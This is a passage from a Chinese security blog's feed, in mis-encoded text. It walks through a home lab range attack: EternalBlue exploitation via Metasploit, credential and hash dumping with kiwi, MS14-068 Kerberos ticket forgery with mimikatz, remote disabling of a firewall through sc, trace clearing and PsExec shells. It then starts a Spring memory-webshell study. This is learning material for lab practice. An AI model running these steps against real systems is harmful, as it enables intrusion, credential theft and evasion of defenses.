open<br></code></pre></td></tr></table></figure><p>æ¼æ´ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*]192.168.183.130<br>   [-&gt;]WIN-ENS2VR5TR3N<br>   [-&gt;]192.168.183.130<br>[*] NetInfo <br>[*]192.168.183.129<br>   [-&gt;]TESTWIN7-PC<br>   [-&gt;]192.168.183.129<br>[+] MS17-010 192.168.183.129    (Windows 7 Enterprise 7601 Service Pack 1)<br>[+] MS17-010 192.168.183.130    (Windows Server 2008 HPC Edition 7601 Service Pack 1)                   <br>[*] NetBios 192.168.183.130 [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server 2008 HPC Edition 7601 Service Pack 1<br></code></pre></td></tr></table></figure><p>win7çš„ä¸»æœºæœ‰MS17-010æ°¸æ’ä¹‹è“æ¼æ´ï¼ŒwinServer2008åº”è¯¥æ˜¯åŸŸæ§ä¹Ÿæœ‰ä¸€ä¸ªæ°¸æ’ä¹‹è“</p><p>é‚£å°±å…ˆæ‰“win7å§ç›´æ¥</p><h2 id="æ‰“win7"><a href="#æ‰“win7" class="headerlink" title="æ‰“win7"></a>æ‰“win7</h2><p>é€šè¿‡porxychainså¯åŠ¨msf</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">proxychains msfconsole<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116174820036.png" alt="image-20241116174820036"></p><p>ç„¶åä¸Šæ°¸æ’ä¹‹è“çš„æ‰«ææ¨¡å—è¯•ä¸€ä¸‹ï¼Œä¸»è¦æ˜¯æµ‹è¯•èƒ½ä¸èƒ½é€š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-built_in">set</span> rhost 192.168.183.129<br>run<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241116175834529.png" alt="image-20241116175834529"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æˆåŠŸæ‰«å‡ºæ¥äº†ms17-010ï¼Œé‚£å°±ç›´æ¥å¼€æ‰“ï¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp <span class="hljs-comment">#å› ä¸ºä¸»æœºåœ¨å†…ç½‘ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œéœ€è¦ç”¨æ­£å‘çš„shell</span><br><span class="hljs-built_in">set</span> target Windows\ 7<br><span class="hljs-built_in">set</span> RHOSTS 192.168.183.129<br><span class="hljs-built_in">set</span> rhost 192.168.183.129<br>run<br></code></pre></td></tr></table></figure><p>ä¸€é¡¿è¶…æ—¶ä¹‹åç»ˆäºæ˜¯æ‹¿åˆ°äº†meterpreter</p><p><img src="https://cdn.clown2024.cn/image-20241116180809503.png" alt="image-20241116180809503"></p><p>getuidçœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241116180833768.png" alt="image-20241116180833768"></p><p>æ¬¸å‘ç°å·²ç»æ˜¯SYSTEMæƒé™äº†</p><p>é‚£å°±ç›´æ¥ä¸åŒææƒäº†ï¼Œç›´æ¥å¸¸è§„å…ˆæ‹¿ä¸€ä¸‹è´¦å·å¯†ç ä¹‹ç±»çš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">load kiwi<br>creds_all<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">msv credentials<br>===============<br><br>Username      Domain  NTLM                              SHA1<br>--------      ------  ----                              ----<br>TESTWIN7-PC$  DEMO    e3ba914bdaca29c197c7191ebf521873  68a1422322c303e4c24d63f381a03b34eb434477<br>douser        DEMO    bc23b0b4d5bf5ff42bc61fb62e13886e  c48096437367aad00ac2dc70552051cd84912a55<br><br>wdigest credentials<br>===================<br><br>Username      Domain  Password<br>--------      ------  --------<br>(null)        (null)  (null)<br>TESTWIN7-PC$  DEMO    /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8<br>                      He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br>douser        DEMO    Dotest123<br><br>kerberos credentials<br>====================<br><br>Username      Domain    Password<br>--------      ------    --------<br>(null)        (null)    (null)<br>douser        DEMO.COM  (null)<br>testwin7-pc$  demo.com  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32<br>                        i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br>testwin7-pc$  DEMO.COM  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-&#x27;ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32<br>                        i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd&quot;JRr<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hashdump<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>testclone:1001:aad3b435b51404eeaad3b435b51404ee:8d8e04036d33ed20f5c2f6ad77e28bb7:::<br></code></pre></td></tr></table></figure><p>é‚£ç°åœ¨win7å°±æ‹¿ä¸‹äº†ï¼Œä½†æ˜¯æˆ‘æƒ³shellè·å¾—cmdçª—å£ä¸€ç›´ä¸è¡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p><img src="https://cdn.clown2024.cn/image-20241116183521507.png" alt="image-20241116183521507"></p><p>åˆä¸€ç›´å‡ºç°æ‹’ç»è¿æ¥äº†</p><p>èšŒåŸ ä½äº†æˆ‘æ›´æ–°äº†msfæƒ³é‡æ–°æ‰“è¯•è¯•çš„ï¼Œç»“æœç›´æ¥ç»™win7æ‰“è“å±å’Œæ­»æœºäº†</p><p>åæ¥å¯ä»¥ä¹‹åä»–è¿˜æ˜¯æ‹¿ä¸åˆ°cmd</p><p><img src="https://cdn.clown2024.cn/image-20241116203423166.png" alt="image-20241116203423166"></p><p>åé¢è¿˜æƒ³å°†msfæ´¾ç”Ÿåˆ°csä¸Šé¢ï¼Œä½†æ˜¯ä¸ä¼šæ´¾ç”Ÿæ­£å‘çš„shellï¼Œæˆ‘çœ‹ç½‘ä¸Šå¤§éƒ¨åˆ†éƒ½æ˜¯å…ˆcsä¸Šçº¿äº†ä¸€å°ä¸»æœºç„¶ååˆ›å»ºä¸­è½¬ç›‘å¬çš„ï¼Œæ²¡æ‰¾åˆ°ç›´æ¥æ´¾ç”Ÿæ­£å‘shellçš„</p><h2 id="æ‰“åŸŸæ§"><a href="#æ‰“åŸŸæ§" class="headerlink" title="æ‰“åŸŸæ§"></a>æ‰“åŸŸæ§</h2><p>é‚£è¿™æ¬¡ç”¨ä¸ä¸Šcsï¼Œç›´æ¥msfä¸€è·¯æ€</p><p>å…ˆç»§ç»­å°è¯•ä¸€ä¸‹æˆ‘ä»¬åˆšåˆšæ‰«å‡ºæ¥çš„æ°¸æ’ä¹‹è“</p><p><img src="https://cdn.clown2024.cn/image-20241116211150550.png" alt="image-20241116211150550"></p><p>okæ‰“äº†ä¸¤éå¤±è´¥äº†ï¼Œé‚£å°±è¯•è¯•å…¶ä»–çš„å§</p><p>è€ƒç‚¹ä¹Ÿè¯´äº†ç”¨åˆ°äº†ms14-068æ¼æ´ï¼Œç”¨msfæœç´¢äº†ä¸€ä¸‹åªæœ‰éªŒè¯æ¼æ´çš„ï¼Œæ²¡æœ‰åˆ©ç”¨æ¼æ´çš„ç¨‹åº</p><p><img src="https://cdn.clown2024.cn/image-20241116211428215.png" alt="image-20241116211428215"></p><blockquote><p>ç¬‘æ­»åæ¥å‘ç°è¿™ä¹Ÿæ˜¯åˆ©ç”¨çš„ï¼Œå› ä¸ºè¿™ä¸ªæ¨¡å—å¤šç”¨äºä¿¡æ¯æ”¶é›†</p></blockquote><p>çœ‹äº†ä¸€ä¸‹win7ï¼Œä½œè€…è´´å¿ƒçš„æŠŠå·¥å…·éƒ½ç»™æˆ‘ä»¬é™„ä¸Šäº†</p><p><img src="https://cdn.clown2024.cn/image-20241116212028478.png" alt="image-20241116212028478"></p><p>åˆ©ç”¨åŸç†å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/feizianquan/p/11760564.html">https://www.cnblogs.com/feizianquan/p/11760564.html</a></p><p>ç›´æ¥æŠŠå·¥å…·ä»win7é‚£æ‹¿è¿‡æ¥æ–¹ä¾¿ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">download C:\\Users\\douser\\Desktop\\MS14-068.exe /home/kali/Desktop<br></code></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼š</p><p>1.åŸŸæ§æ²¡æœ‰æ‰“MS14-068çš„è¡¥ä¸(KB3011780)</p><p>2.æ‹¿ä¸‹ä¸€å°åŠ å…¥åŸŸçš„è®¡ç®—æœº</p><p>3.æœ‰è¿™å°åŸŸå†…è®¡ç®—æœºçš„åŸŸç”¨æˆ·å¯†ç å’ŒSid</p><p>æˆ‘ä»¬è¿˜å·®ä¸€ä¸ªsidæ²¡æœ‰æŠ“å–åˆ°ï¼Œè¦å»æŠ“å–ä¸€ä¸‹</p><p>çº¢æ¸©äº†ï¼Œè¿™ä¼šè¯åˆæ–­äº†ï¼Œå—ä¸äº†äº†ï¼Œç›´æ¥å»win7é‚£é‡Œå·ä¸€ä¸ªsidè¿‡æ¥(S-1-5-21-979886063-1111900045-1414766810-1107)ï¼Œdouserç”¨æˆ·çš„</p><p>æ­£å¸¸èƒ½æ‹¿cmdçš„è¯ç›´æ¥whoami &#x2F;allæˆ–è€…whoami &#x2F;userå°±èƒ½çœ‹åˆ°sidäº†</p><p>æˆ–è€…ç”¨meterpreterçš„run post&#x2F;windows&#x2F;gather&#x2F;credentialsåº”è¯¥ä¹Ÿå¯ä»¥</p><p>å·¥å…·åˆ©ç”¨çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -p &lt;clearPassword&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;<br></code></pre></td></tr></table></figure><p>å®Œäº†xsæ‰å‘ç°è¿™æ˜¯exeç¨‹åºï¼ŒLinuxç”¨ä¸äº†ï¼Œé‚£å°±æ”¹å‚è€ƒè¿™ç¯‡æ–‡ç« çš„å…¶ä»–æ‰“æ³•ï¼š<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/04.%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/04.%E5%9F%9F%E6%8E%A7%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html#cve-2014-6324%EF%BC%88ms14-068%EF%BC%89">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/04.%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/04.%E5%9F%9F%E6%8E%A7%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E.html#cve-2014-6324%EF%BC%88ms14-068%EF%BC%89</a></p><p>çœ‹äº†åŠå¤©å¾—ä½œç½¢äº†æ„Ÿè§‰ğŸ˜­ï¼ŒåŸºæœ¬éƒ½æ˜¯åœ¨cmdä¸‹æ“ä½œæˆ–è€…ç›´æ¥å¼€å¯è¿œç¨‹æ¡Œé¢ä¸Šå»æ“ä½œ</p><p>ç®€å•è®°ä¸€ä¸‹æµç¨‹å§ï¼Œä¸‹é¢çš„æ“ä½œæ˜¯åœ¨win7çš„cmdä¸Šæ‰§è¡Œçš„ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://blog.csdn.net/zy15667076526/article/details/116059592">https://blog.csdn.net/zy15667076526/article/details/116059592</a></p><p>é¦–å…ˆç”¨ms14-068ä¼ªé€ ç¥¨æ®</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">ms14-<span class="hljs-number">068</span>.exe -u douser@DEMO.com -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">979886063</span>-<span class="hljs-number">1111900045</span>-<span class="hljs-number">1414766810</span>-<span class="hljs-number">1107</span> -d <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">183</span>.<span class="hljs-number">130</span> -p Dotest123<br></code></pre></td></tr></table></figure><p>ä»–ä¼šç”Ÿæˆä¸€ä¸ªç¥¨æ®æ–‡ä»¶ï¼Œç„¶åç”¨mimikatzæ¥æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # kerberos::purge         //æ¸…ç©ºå½“å‰æœºå™¨ä¸­æ‰€æœ‰å‡­è¯ï¼Œå¦‚æœæœ‰åŸŸæˆå‘˜å‡­è¯ä¼šå½±å“å‡­è¯ä¼ªé€ <br>mimikatz # kerberos::list          //æŸ¥çœ‹å½“å‰æœºå™¨å‡­è¯<br>mimikatz # kerberos::ptc &lt;ç”Ÿæˆçš„ç¥¨æ®æ–‡ä»¶&gt;   //å°†ç¥¨æ®æ³¨å…¥åˆ°å†…å­˜ä¸­<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æŸ¥çœ‹åŸŸæ§æˆ–è€…åˆ—å‡ºå…¶cç›˜çš„æ–‡ä»¶äº†</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\WIN-ENS2VR5TR3N<br><span class="hljs-built_in">dir</span> \\WIN-ENS2VR5TR3N\c$<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥é€šè¿‡scå‘½ä»¤æ¥åˆ›å»ºæœåŠ¡æ‰§è¡Œå‘½ä»¤ï¼Œæ¯”å¦‚å…³é—­é˜²ç«å¢™</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &quot;netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off&quot;<br><br>sc \\WIN-ENS2VR5TR3N <span class="hljs-built_in">start</span> unablefirewall<br></code></pre></td></tr></table></figure><p>å…³é—­é˜²ç«å¢™ä¹‹åå°±å¯ä»¥ç›´æ¥æ°¸æ’ä¹‹è“ä¸Šçº¿äº†å…¶å®</p><p>ä¹‹å‰å¤±è´¥æ˜¯å› ä¸ºè¢«é˜²ç«å¢™æ‹¦æˆª</p><p><strong>ä¸€äº›æ¸…é™¤ç—•è¿¹çš„æ“ä½œ</strong></p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">klist purge #å¸è½½å‡­æ®<br>klist #æŸ¥çœ‹ç¥¨æ®<br></code></pre></td></tr></table></figure><p><strong>è·å–äº¤äº’å¼shell</strong></p><p>ç°åœ¨æ˜¯æˆåŠŸæ³¨å…¥äº†å‡­è¯</p><p>ç„¶åæˆ‘ä»¬å¯ä»¥åˆ©ç”¨PsExec.exeè·å–ä¸€ä¸ªäº¤äº’å¼çš„shell</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">PsExec.exe -accepteula -s \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">19</span> <span class="hljs-built_in">cmd</span>.exe<br></code></pre></td></tr></table></figure><p><strong>è¿œç¨‹ç™»å½•æ“ä½œ</strong></p><p>å¯ä»¥ç›´æ¥ç”¨æ°¸æ’ä¹‹è“è·å–å¯†ç ä¹‹åredesktopç™»å½•</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å› ä¸ºå…¼å®¹æ€§å·²ç»ä¼¼äº†ä¸¤ä¸ªé¶åœºï¼Œæ±‚æ±‚ä½ åˆ«ä¼¼äº†&lt;/p&gt;
&lt;h1 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h1&gt;&lt;p&gt;ä¸¤å¼ ç½‘å¡ï¼Œä¸€å¼ VMnet0å’ŒVMnet1éƒ½æ˜¯ä»…ä¸»æœºæ¨¡å¼&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>çº¢æ—¥é¶åœºä¸‰</title>
    <link href="https://clowsman.github.io/2024/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/"/>
    <id>https://clowsman.github.io/2024/11/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/</id>
    <published>2024-11-14T15:16:59.000Z</published>
    <updated>2024-11-15T12:01:48.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p>æ‰“å¼€è™šæ‹Ÿæœºé•œåƒä¸ºæŒ‚èµ·çŠ¶æ€ï¼Œç¬¬ä¸€æ—¶é—´è¿›è¡Œå¿«ç…§ï¼Œéƒ¨åˆ†æœåŠ¡æœªåšè‡ªå¯ï¼Œé‡å¯åæ— æ³•è‡ªåŠ¨è¿è¡Œã€‚</p><p>æŒ‚èµ·çŠ¶æ€ï¼Œè´¦å·å·²é»˜è®¤ç™»é™†ï¼Œcentosä¸ºå‡ºç½‘æœºï¼Œç¬¬ä¸€æ¬¡è¿è¡Œï¼Œéœ€é‡æ–°è·å–æ¡¥æ¥æ¨¡å¼ç½‘å¡ipï¼Œä¹Ÿå°±æ˜¯é‡å¯ä¸€ä¸‹</p><p>é™¤é‡æ–°è·å–ipï¼Œä¸å»ºè®®è¿›è¡Œä»»ä½•è™šæ‹Ÿæœºæ“ä½œã€‚</p><p><img src="https://cdn.clown2024.cn/image-20241115110952089.png" alt="image-20241115110952089"></p><p><strong>ç›®æ ‡ï¼šåŸŸæ§ä¸­å­˜åœ¨ä¸€ä»½é‡è¦æ–‡ä»¶ã€‚</strong></p><p>æœ¬æ¬¡ç¯å¢ƒä¸ºé»‘ç›’æµ‹è¯•ï¼Œä¸æä¾›è™šæ‹Ÿæœºè´¦å·å¯†ç ã€‚</p><h1 id="ä½œåºŸäº†"><a href="#ä½œåºŸäº†ğŸ˜­" class="headerlink" title="ä½œåºŸäº†ğŸ˜­"></a>ä½œåºŸäº†ğŸ˜­</h1><p>ä¸¤å°Linuxé¶æœºè¿è¡Œä¸äº†ï¼Œåªèƒ½å¼ºåˆ¶é‡å¯æ‰èƒ½ç”¨ï¼Œä½†æ˜¯è¿™æ ·å°±ä¸æ˜¯ç™»å½•çŠ¶æ€äº†ï¼Œç„¶åè´¦å·å¯†ç ä¹Ÿä¸çŸ¥é“ï¼Œç›´æ¥æ­»åœ¨æ­å»ºç¯å¢ƒäº†</p><p>åªèƒ½çœ‹çœ‹åˆ«äººçš„æ‰“é¶è¿‡ç¨‹äº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒé…ç½®&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒé…ç½®&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒé…ç½®&quot;&gt;&lt;/a&gt;ç¯å¢ƒé…ç½®&lt;/h1&gt;&lt;p&gt;æ‰“å¼€è™šæ‹Ÿæœºé•œåƒä¸ºæŒ‚èµ·çŠ¶æ€ï¼Œç¬¬ä¸€æ—¶é—´è¿›è¡Œå¿«ç…§ï¼Œéƒ¨åˆ†æœåŠ¡æœªåšè‡ªå¯ï¼Œé‡å¯åæ— æ³•è‡ªåŠ¨è¿è¡Œã€‚&lt;/p&gt;
&lt;p&gt;æŒ‚èµ·çŠ¶æ€ï¼Œè´¦å·å·²é»˜è®¤ç™»é™†ï¼Œ</summary>
      
    
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="å†…ç½‘æ¸—é€" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Springå†…å­˜é©¬å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-13T03:17:56.000Z</published>
    <updated>2024-11-14T08:32:08.170Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>Springæ¡†æ¶æ¯”è¾ƒå¸¸ç”¨å°±ä¸è¯´äº†ï¼Œç½‘ä¸Šå¤§éƒ¨åˆ†éƒ½æ˜¯å»ºä¸€ä¸ªspring+springmvcçš„é¡¹ç›®æ¥æµ‹è¯•å†…å­˜é©¬ï¼Œå†…å­˜é©¬ä¸»è¦çš„é€»è¾‘éƒ¨åˆ†éƒ½é›†ä¸­åœ¨springmvcçš„éƒ¨åˆ†ï¼Œå› ä¸ºè´Ÿè´£å¤„ç†è·¯ç”±è¯·æ±‚åŸºæœ¬éƒ½æ˜¯éƒ½æ˜¯éœ€è¦ç»ç”±springmvcï¼Œæ‰€ä»¥æˆ‘çœ‹ä¹Ÿæœ‰å«springmvcå†…å­˜é©¬çš„ã€‚</p><p>æˆ‘è¿™é‡Œå°±ç›´æ¥æ­ä¸€ä¸ªspringbooté¡¹ç›®æ¯”è¾ƒæ–¹ä¾¿äº†ï¼Œåæ­£æœ¬èº«ä¹Ÿæ˜¯æœ‰springmvcçš„ï¼Œæ‰€ä»¥å†…éƒ¨é€»è¾‘ä¹Ÿæ˜¯ä¸€æ ·åˆ†æ</p><p>ç‰ˆæœ¬å¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span> <span class="hljs-comment">&lt;!-- lookup parent from repository --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="controllerå†…å­˜é©¬"><a href="#Controllerå†…å­˜é©¬" class="headerlink" title="Controllerå†…å­˜é©¬"></a>Controllerå†…å­˜é©¬</h1><h2 id="contolleræ³¨å†Œæµç¨‹"><a href="#Contolleræ³¨å†Œæµç¨‹" class="headerlink" title="Contolleræ³¨å†Œæµç¨‹"></a>Contolleræ³¨å†Œæµç¨‹</h2><p>æˆ‘ä»¬è¦å…ˆçŸ¥é“Controllerçš„æ³¨å†Œé€»è¾‘</p><p>ç¼–å†™ä¸€ä¸ªç®€å•çš„controllerç„¶åä¸‹æ–­ç‚¹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241113133819511.png" alt="image-20241113133819511"></p><p>è¿™é‡Œèƒ½çœ‹åˆ°è¯·æ±‚å¤„ç†çš„è°ƒç”¨æ ˆ</p><p>åœ¨AbstractHandlerMethodMappingçš„initHandlerMethodsæ–¹æ³•ä¸‹æ–­ç‚¹æ¥çœ‹çœ‹æ˜¯æ€ä¹ˆæ³¨å†Œcontrollerçš„</p><p><img src="https://cdn.clown2024.cn/image-20241113134431011.png" alt="image-20241113134431011"></p><p>ä»è¿™ä¸ªä»£ç ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°å°±æ˜¯å¼€å§‹å¯¹æ¯ä¸ªæ‰«æåˆ°çš„beanNameå¯¹åº”çš„beanå¼€å§‹å¤„ç†</p><p>è¿›å»çœ‹çœ‹ä»–çš„processæ–¹æ³•æ˜¯æ€ä¹ˆå¤„ç†çš„</p><p><img src="https://cdn.clown2024.cn/image-20241113135311833.png" alt="image-20241113135311833"></p><p>ç›´æ¥çœ‹å¯¹æˆ‘ä»¬å†™çš„helloControlleræ˜¯æ€ä¹ˆå¤„ç†ï¼Œè¿™é‡Œæœ‰ä¸ªisHandler()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113135415874.png" alt="image-20241113135415874"></p><p>ä»–ä¼šåˆ¤æ–­è¿™ä¸ªbeanæ˜¯å¦ä¸ºControlleræˆ–è€…RequestMappingï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬çš„è¿™ä¸ªä¼šè¿”å›true</p><p>ç„¶åå°±ä¼šè¿›åˆ°<strong>detectHandlerMethods</strong>æ–¹æ³•ï¼Œè¿›å»çœ‹ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241113162637157.png" alt="image-20241113162637157"></p><p>å¯ä»¥çœ‹åˆ°ä»–ä¼šå…ˆè·å–å¯¹åº”çš„userTypeã€handlerã€methodï¼Œè¿˜æœ‰å¯¹åº”çš„Mappingï¼Œæœ€åéå†ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•å’Œmappingï¼Œç„¶åè°ƒç”¨ä¸€ä¸ªregisterHandlerMethodæ–¹æ³•æ¥è¿›è¡Œæ³¨å†Œç»‘å®š</p><p>è¿™é‡Œçš„mappingä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ä»–çš„ä¿¡æ¯æ˜¯è¢«ä¿å­˜åœ¨RequestMappingInfoè¿™ä¸ªç±»ä¸­çš„ï¼Œä¸‹é¢æ˜¯è¯¥ç±»ä¸­çš„ä¸€äº›å±æ€§</p><p><img src="https://cdn.clown2024.cn/image-20241113163354872.png" alt="image-20241113163354872"></p><p>ç„¶åmappingçš„åˆ›å»ºæ˜¯åœ¨å‰é¢çš„getMappingForMethodæ–¹æ³•åˆ›å»ºçš„</p><p><img src="https://cdn.clown2024.cn/image-20241113163647021.png" alt="image-20241113163647021"></p><p>è¿›å»çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241113164045236.png" alt="image-20241113164045236"></p><p>é‡Œé¢çš„å…·ä½“æµç¨‹å°±è‡ªå·±çœ‹çœ‹å°±è¡Œï¼Œæ€»ä¹‹ä»–ä¼šè§£ææ–¹æ³•ä¸Šçš„æ³¨è§£ï¼Œç„¶ååˆ›å»ºå¯¹åº”çš„RequestMappingInfo</p><p>å†å›åˆ°registerHandlerMethodæ³¨å†Œæ–¹æ³•è¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241113164335000.png" alt="image-20241113164335000"></p><p><img src="https://cdn.clown2024.cn/image-20241113164359179.png" alt="image-20241113164359179"></p><p><img src="https://cdn.clown2024.cn/image-20241113164444913.png" 